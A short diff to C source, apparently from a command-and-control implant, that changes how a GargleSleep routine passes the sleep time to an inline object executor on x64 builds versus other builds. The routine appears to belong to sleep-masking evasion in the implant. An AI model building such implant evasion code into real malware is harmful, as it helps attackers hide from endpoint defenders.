@@ -152,9 +152,15 @@ void GargleSleep(DWORD time) {
 		data_extract(&parser);
 		prefix = dlen - parser.length;
 		entry = data_int(&parser);
-		be_time = htonl(time);
-		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time)))
+#if defined(_M_X64)
+		be_time = time;
+		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 1))
 			Sleep(time);
+#else
+		be_time = htonl(time);
+		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 0))
+			Sleep(time);
+#endif
 		free(decoded);
 		return;
 	}
